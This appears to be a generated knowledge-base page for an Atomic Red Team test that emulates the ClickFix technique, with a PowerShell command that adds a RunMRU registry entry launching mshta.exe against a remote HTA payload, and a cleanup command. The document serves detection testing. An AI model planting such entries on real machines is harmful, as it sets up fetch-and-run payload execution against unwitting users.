---
atomic_guid: "3f3120f0-7e50-4be2-88ae-54c61230cb9f"
title: "ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3f3120f0-7e50-4be2-88ae-54c61230cb9f"
  - "ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell

Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.
This technique relies on user interaction (Win+R + Enter) to trigger execution.
Used in social engineering campaigns that aim to bypass traditional startup methods.
Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection

## Metadata

- Atomic GUID: 3f3120f0-7e50-4be2-88ae-54c61230cb9f
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Executor

- name: powershell

### Command

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
```

### Cleanup

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
